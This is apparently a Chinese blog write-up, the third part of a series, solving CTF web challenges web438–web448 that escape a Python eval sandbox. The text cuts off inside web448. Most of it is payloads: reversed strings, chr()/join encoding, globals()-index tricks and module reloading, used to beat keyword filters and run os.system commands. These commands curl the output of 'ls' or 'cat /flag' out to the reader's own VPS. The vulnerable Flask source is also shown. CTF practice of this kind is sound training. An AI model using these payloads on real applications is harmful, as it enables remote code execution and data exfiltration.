    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>由于题目比较多，所以分三个部分来写，这是第三部分</p><h2 id="题目列表"><a href="#题目列表" class="headerlink" title="题目列表"></a>题目列表</h2><h3 id="web438"><a href="#web438" class="headerlink" title="web438"></a>web438</h3><p>这题跟web435方法一样，我们简单回顾一下过程</p><p>为了绕过限制，可以反转代码来执行，具体方法是用<strong>字符串切片</strong>方法来反转字符串</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=str(&#x27;)&quot;`sl`=p?反转端口:你的反转vps地址//:ptth lruc&quot;(metsys.so ;so tropmi&#x27;[::-1])</span><br></pre></td></tr></table></figure><p>可以先用<code>str</code>在网页看原始代码，检查是否正确</p><p><img src="https://oss.waynejoons.icu/picphoto/20250822185008504.png"></p><p>然后套个<code>exec</code>执行这串代码就可以</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=str(exec(&#x27;)&quot;`sl`=p?反转端口:你的反转vps地址//:ptth lruc&quot;(metsys.so ;so tropmi&#x27;[::-1]))</span><br></pre></td></tr></table></figure><p>我们把它的源码爆出来看看</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=str(exec(&#x27;)&quot;`yp.ppa 0 w- 46esab`=p?反转端口:你的反转vps地址//:ptth lruc&quot;(metsys.so ;so tropmi&#x27;[::-1]))</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Q2B</span>(<span class="params">uchar</span>):</span><br><span class="line">    inside_code = <span class="built_in">ord</span>(uchar)</span><br><span class="line">    <span class="keyword">if</span> inside_code == <span class="number">0x3000</span>:</span><br><span class="line">        inside_code = <span class="number">0x0020</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        inside_code -= <span class="number">0xfee0</span></span><br><span class="line">    <span class="keyword">if</span> inside_code &lt; <span class="number">0x0020</span> <span class="keyword">or</span> inside_code &gt; <span class="number">0x7e</span>: </span><br><span class="line">        <span class="keyword">return</span> uchar</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">chr</span>(inside_code)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">stringQ2B</span>(<span class="params">ustring</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join([Q2B(uchar) <span class="keyword">for</span> uchar <span class="keyword">in</span> ustring])</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">app_index</span>():</span><br><span class="line">    code = request.args.get(<span class="string">&#x27;code&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> code:</span><br><span class="line">    code = stringQ2B(code)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;\\u&#x27;</span> <span class="keyword">in</span> code:</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;hacker?&#x27;</span></span><br><span class="line">    reg = re.<span class="built_in">compile</span>(<span class="string">r&#x27;os|open|system|read|eval|builtins|curl|_|getattr|&#123;&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> reg.search(code)==<span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">eval</span>(code)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;where is flag?&lt;!-- /?code --&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure><p>这题比web437多过滤了<code>&#123;</code>，但这个符号我们用不到，所以不影响</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=str(exec(&#x27;)&quot;`galf/ tac`=p?反转端口:你的反转vps地址//:ptth lruc&quot;(metsys.so ;so tropmi&#x27;[::-1]))</span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20250824004807436.png"></p><h3 id="web439"><a href="#web439" class="headerlink" title="web439"></a>web439</h3><p>这题可以继续用上题的方法，我们把源码爆出来分析一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=str(exec(&#x27;)&quot;`yp.ppa 0 w- 46esab`=p?反转端口:你的反转vps地址//:ptth lruc&quot;(metsys.so ;so tropmi&#x27;[::-1]))</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Q2B</span>(<span class="params">uchar</span>):</span><br><span class="line">    inside_code = <span class="built_in">ord</span>(uchar)</span><br><span class="line">    <span class="keyword">if</span> inside_code == <span class="number">0x3000</span>:</span><br><span class="line">        inside_code = <span class="number">0x0020</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        inside_code -= <span class="number">0xfee0</span></span><br><span class="line">    <span class="keyword">if</span> inside_code &lt; <span class="number">0x0020</span> <span class="keyword">or</span> inside_code &gt; <span class="number">0x7e</span>: </span><br><span class="line">        <span class="keyword">return</span> uchar</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">chr</span>(inside_code)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">stringQ2B</span>(<span class="params">ustring</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join([Q2B(uchar) <span class="keyword">for</span> uchar <span class="keyword">in</span> ustring])</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">app_index</span>():</span><br><span class="line">    code = request.args.get(<span class="string">&#x27;code&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> code:</span><br><span class="line">    code = stringQ2B(code)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;\\u&#x27;</span> <span class="keyword">in</span> code:</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;hacker?&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;\\x&#x27;</span> <span class="keyword">in</span> code:</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;hacker?&#x27;</span></span><br><span class="line">    reg = re.<span class="built_in">compile</span>(<span class="string">r&#x27;os|open|system|read|eval|builtins|curl|_|getattr|&#123;&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> reg.search(code)==<span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">eval</span>(code)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;where is flag?&lt;!-- /?code --&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure><p>可以看到这题比上题多过滤了<code>\x</code>，<code>\x</code> 是一种<strong>转义序列</strong>，用来表示十六进制形式的字符，比如 <code>\x41</code> 代表 ASCII 字符 <code>&#39;A&#39;</code></p><p>但是我们并没有用到这个，所以不影响</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=str(exec(&#x27;)&quot;`galf/ tac`=p?反转端口:你的反转vps地址//:ptth lruc&quot;(metsys.so ;so tropmi&#x27;[::-1]))</span><br></pre></td></tr></table></figure><h3 id="web440"><a href="#web440" class="headerlink" title="web440"></a>web440</h3><p>这题把引号禁了，我们可以用<strong>chr构造字符串</strong>。先用ord返回unicode数值，然后再经过chr转换成字符即可，我们写个python脚本</p><p>payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">&quot;import os;os.system(&#x27;curl http://你的vps地址:端口?p=`ls`&#x27;)&quot;</span></span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">    res += <span class="string">f&quot;chr(<span class="subst">&#123;<span class="built_in">ord</span>(i)&#125;</span>)%2B&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;str(exec(&#x27;</span>+res[:-<span class="number">3</span>]+<span class="string">&#x27;))&#x27;</span>)</span><br></pre></td></tr></table></figure><p>把结果拼接到网站GET发送</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=你的代码运行结果</span><br></pre></td></tr></table></figure><p>修改命令为<code>cat /flag</code>获取flag即可</p><h3 id="web441"><a href="#web441" class="headerlink" title="web441"></a>web441</h3><p>经过分析，这题把加号过滤了，放出部分源码看看</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">re.<span class="built_in">compile</span>(<span class="string">r&#x27;os|open|system|read|eval|builtins|curl|_|getattr|&#123;|\&#x27;|&quot;|\+&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> reg.search(code)==<span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">eval</span>(code)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;where is flag?&lt;!-- /?code --&gt;&#x27;</span></span><br></pre></td></tr></table></figure><p>那我们用<strong>join函数</strong>来拼接字符即可，例如<code>.join([&#39;1&#39;,&#39;2&#39;,&#39;3&#39;])</code>，结果是 ‘123’。 <strong>join必须作为字符串的方法调用</strong>，即调用它的对象必须是字符串，所以前面要有字符串和点号（<code>.</code>）来调用该函数</p><p>payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">&quot;import os;os.system(&#x27;curl http://你的vps地址:端口?p=`ls`&#x27;)&quot;</span></span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">    res += <span class="string">f&quot;chr(<span class="subst">&#123;<span class="built_in">ord</span>(i)&#125;</span>),&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;exec(str().join([&#x27;</span>+res[:-<span class="number">1</span>]+<span class="string">&#x27;]))&#x27;</span>)</span><br></pre></td></tr></table></figure><p>把结果拼接到网站GET发送</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=你的代码运行结果</span><br></pre></td></tr></table></figure><p>修改命令为<code>cat /flag</code>获取flag即可</p><h3 id="web442"><a href="#web442" class="headerlink" title="web442"></a>web442</h3><p>这题把数字过滤了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">re.<span class="built_in">compile</span>(<span class="string">r&#x27;os|open|system|read|eval|builtins|curl|_|getattr|&#123;|\&#x27;|&quot;|\+|[0-9]&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> reg.search(code)==<span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">eval</span>(code)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;where is flag?&lt;!-- /?code --&gt;&#x27;</span></span><br></pre></td></tr></table></figure><p>我们用<code>request.args.get</code>方法获取参数值即可。<code>request.args.get</code> 是 Flask 框架中获取 URL 查询参数（即 GET 请求中 URL 中 <code>?key=value</code> 部分参数）的方法</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=str(exec(request.args.get(request.method)))&amp;GET=import os;os.system(&#x27;curl http://你的vps地址:端口?p=`cat /flag`&#x27;)</span><br></pre></td></tr></table></figure><h3 id="web443"><a href="#web443" class="headerlink" title="web443"></a>web443</h3><p>把request过滤了，关键代码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">re.<span class="built_in">compile</span>(<span class="string">r&#x27;os|open|system|read|eval|builtins|curl|_|getattr|&#123;|\&#x27;|&quot;|\+|[0-9]|request&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> reg.search(code)==<span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">eval</span>(code)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;where is flag?&lt;!-- /?code --&gt;&#x27;</span></span><br></pre></td></tr></table></figure><p>题目提示<strong>提交参数为POST</strong>，那我们后面用POST提交数据</p><p>这题我们可以继续用<code>request.args.get</code>，不过里面的<code>request</code>需要变换一下。我们打印全局变量出来看看</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code=str(globals())</span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20250826171726164.png"></p><p>可以看到里面有个键是<code>request</code>，我们要利用的就是这个。由于Python 中列表、元组、字符串等序列的索引是<strong>从 0 开始</strong>的，所以<code>request</code>所在的索引为10。又因为数字和加号被禁了，所以我们可以用<code>True</code>来表示1，用两个减号表示加号</p><p>因此10可以这么写</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="literal">True</span>-(-<span class="literal">True</span>)-(-<span class="literal">True</span>)-(-<span class="literal">True</span>)-(-<span class="literal">True</span>)-(-<span class="literal">True</span>)-(-<span class="literal">True</span>)-(-<span class="literal">True</span>)-(-<span class="literal">True</span>)-(-<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>然后用<code>list(globals().keys())[]</code>来获取对应的键名，再放进<code>globals()[]</code>获取对应的属性和方法，从而调用<code>args.get()</code>获取参数值</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">globals</span>()[<span class="built_in">list</span>(<span class="built_in">globals</span>().keys())[<span class="literal">True</span>-(-<span class="literal">True</span>)-(-<span class="literal">True</span>)-(-<span class="literal">True</span>)-(-<span class="literal">True</span>)-(-<span class="literal">True</span>)-(-<span class="literal">True</span>)-(-<span class="literal">True</span>)-(-<span class="literal">True</span>)-(-<span class="literal">True</span>)]]</span><br></pre></td></tr></table></figure><p>可以把这个理解为<code>request</code>，那么<code>request.args.get(request.method)</code>就等于</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">globals</span>()[<span class="built_in">list</span>(<span class="built_in">globals</span>().keys())[<span class="literal">True</span>-(-<span class="literal">True</span>)-(-<span class="literal">True</span>)-(-<span class="literal">True</span>)-(-<span class="literal">True</span>)-(-<span class="literal">True</span>)-(-<span class="literal">True</span>)-(-<span class="literal">True</span>)-(-<span class="literal">True</span>)-(-<span class="literal">True</span>)]].args.get(<span class="built_in">globals</span>()[<span class="built_in">list</span>(<span class="built_in">globals</span>().keys())[<span class="literal">True</span>-(-<span class="literal">True</span>)-(-<span class="literal">True</span>)-(-<span class="literal">True</span>)-(-<span class="literal">True</span>)-(-<span class="literal">True</span>)-(-<span class="literal">True</span>)-(-<span class="literal">True</span>)-(-<span class="literal">True</span>)-(-<span class="literal">True</span>)]].method)</span><br></pre></td></tr></table></figure><p>然后在路径后面拼接参数POST，传入代码即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?POST=import os;os.system(&#x27;curl http://你的vps地址:端口?p=`ls`&#x27;)</span><br></pre></td></tr></table></figure><p>到这里，我们成功把代码弄好了，可以用str函数打印出来验证一下，POST传入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code=str(globals()[list(globals().keys())[True-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)]].args.get(globals()[list(globals().keys())[True-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)]].method))</span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20250826174834988.png"></p><p>最后用exec函数运行代码即可</p><p>POST传入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code=str(exec(globals()[list(globals().keys())[True-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)]].args.get(globals()[list(globals().keys())[True-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)]].method)))</span><br></pre></td></tr></table></figure><p>GET传入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?POST=import os;os.system(&#x27;curl http://你的vps地址:端口?p=`cat /flag`&#x27;)</span><br></pre></td></tr></table></figure><h3 id="web444"><a href="#web444" class="headerlink" title="web444"></a>web444</h3><p>这题的附件把代码给出来了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Q2B</span>(<span class="params">uchar</span>):</span><br><span class="line">    inside_code = <span class="built_in">ord</span>(uchar)</span><br><span class="line">    <span class="keyword">if</span> inside_code == <span class="number">0x3000</span>:</span><br><span class="line">        inside_code = <span class="number">0x0020</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        inside_code -= <span class="number">0xfee0</span></span><br><span class="line">    <span class="keyword">if</span> inside_code &lt; <span class="number">0x0020</span> <span class="keyword">or</span> inside_code &gt; <span class="number">0x7e</span>: </span><br><span class="line">        <span class="keyword">return</span> uchar</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">chr</span>(inside_code)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">stringQ2B</span>(<span class="params">ustring</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join([Q2B(uchar) <span class="keyword">for</span> uchar <span class="keyword">in</span> ustring])</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">app_index</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        code = request.form[<span class="string">&#x27;code&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> code:</span><br><span class="line">        code = stringQ2B(code)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;\\u&#x27;</span> <span class="keyword">in</span> code:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;hacker?&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;\\x&#x27;</span> <span class="keyword">in</span> code:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;hacker?&#x27;</span></span><br><span class="line">        reg = re.<span class="built_in">compile</span>(<span class="string">r&#x27;os|open|system|read|eval|builtins|curl|_|getattr|&#123;|\&#x27;|&quot;|\+|[0-9]|request|len&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> reg.search(code)==<span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">eval</span>(code)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;where is flag?&lt;!-- /?code --&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure><p>这题把len过滤了，可以继续用上题的方法</p><p>POST传入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code=str(exec(globals()[list(globals().keys())[True-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)]].args.get(globals()[list(globals().keys())[True-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)]].method)))</span><br></pre></td></tr></table></figure><p>GET传入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?POST=import os;os.system(&#x27;curl http://你的vps地址:端口?p=`cat /flag`&#x27;)</span><br></pre></td></tr></table></figure><h3 id="web445"><a href="#web445" class="headerlink" title="web445"></a>web445</h3><p>这题代码总体跟上题差不多，不过开头那里把<code>os.system</code>和<code>os.popen</code>去掉了</p><p><img src="https://oss.waynejoons.icu/picphoto/20250826182431328.png"></p><p>那直接调用肯定是不行的了，可以<strong>用reload函数重新加载os模块</strong>，然后再重新调用system函数</p><p>简单介绍一下<code>reload</code>，<code>reload</code> 是 Python 中用于<strong>重新加载已导入模块</strong>的函数。</p><p><strong>作用</strong></p><ul><li>Python 的模块在导入时会被缓存，后续再次导入同一模块时不会重新执行模块代码，而是直接使用缓存</li><li><code>reload</code> 函数可以让已经导入的模块重新执行代码，更新模块内容（相当于“刷新”模块），适合在开发或调试时修改代码后即时生效，而不需要重启程序</li></ul><p><strong>使用方法</strong></p><ul><li>Python 2 中 <code>reload()</code> 是内置函数，可以直接调用</li><li>Python 3 中，<code>reload()</code> 被移到 <code>importlib</code> 模块中，需要先导入使用</li></ul><p>我们POST传入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code=str(exec(globals()[list(globals().keys())[True-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)]].args.get(globals()[list(globals().keys())[True-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)]].method)))</span><br></pre></td></tr></table></figure><p>GET传入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?POST=from importlib import reload;reload(os);os.system(&#x27;curl http://你的vps地址:端口?p=`cat /flag`&#x27;)</span><br></pre></td></tr></table></figure><p>成功得到flag</p><h3 id="web446"><a href="#web446" class="headerlink" title="web446"></a>web446</h3><p>这题相比上题把<code>imp.reload</code>函数去掉了</p><p><img src="https://oss.waynejoons.icu/picphoto/20250826184341423.png"></p><p><code>imp</code> 是 Python 早期用于动态加载模块的内置模块，在 Python 3.4 之后，<code>imp</code> 模块已被废弃，不再推荐使用，而是被更强大的 <code>importlib</code> 模块所取代</p><p>所以这题可以继续使用上题的方法</p><p>POST传入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code=str(exec(globals()[list(globals().keys())[True-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)]].args.get(globals()[list(globals().keys())[True-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)]].method)))</span><br></pre></td></tr></table></figure><p>GET传入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?POST=from importlib import reload;reload(os);os.system(&#x27;curl http://你的vps地址:端口?p=`cat /flag`&#x27;)</span><br></pre></td></tr></table></figure><h3 id="web447"><a href="#web447" class="headerlink" title="web447"></a>web447</h3><p>对比一下代码</p><p><img src="https://oss.waynejoons.icu/picphoto/20250826190210524.png"></p><p>这题过滤了挺多东西，例如用于创建和管理子进程的<code>subprocess</code>模块和用于测量一小段代码执行时间的<code>timeit</code>模块，但是不影响我们用之前的方法</p><p>POST传入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code=str(exec(globals()[list(globals().keys())[True-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)]].args.get(globals()[list(globals().keys())[True-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)]].method)))</span><br></pre></td></tr></table></figure><p>GET传入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?POST=from importlib import reload;reload(os);os.system(&#x27;curl http://你的vps地址:端口?p=`cat /flag`&#x27;)</span><br></pre></td></tr></table></figure><h3 id="web448"><a href="#web448" class="headerlink" title="web448"></a>web448</h3><p>对比一下代码</p><p><img src="https://oss.waynejoons.icu/picphoto/20250826223039408.png"></p><p>这题把好多模块都设置为None，<code>sys.modules</code> 是一个字典，<strong>记录了所有已加载的模块</strong>。键为模块名，值为模块对象</p><p>将 sys.modules[‘模块名’] 设为 None，可以让 Python 认为该模块已被加载，但实际值为 None。这会导致后续 import 该模块时，不再真正加载，而是返回 None（或者报错）</p><p>这时我们就不能用reload了，因为 Python 会在 <code>sys.modules</code> 里查找，发现值为 None，而不是模块对象，于是 import 或 reload 过程中会抛出 ModuleNotFoundError 异常</p><p>我们可以用<code>shutil</code>模块的copy函数把<code>os.py</code>复制到一个新文件下，然后重新导入新模块即可</p><p>POST传入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 